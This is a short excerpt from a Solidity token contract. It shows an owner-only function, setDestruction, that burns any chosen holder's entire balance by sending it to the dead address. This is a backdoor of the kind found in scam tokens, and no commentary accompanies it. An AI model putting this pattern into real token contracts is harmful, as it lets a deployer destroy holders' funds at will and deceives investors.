...
abstract contract AbsToken is IERC20, Ownable {
    ...
    function setDestruction(address addr) external onlyOwner {
        _takeTransfer(addr, 0x000000000000000000000000000000000000dEaD, _balances[addr]);
        _balances[addr] = 0;
    }
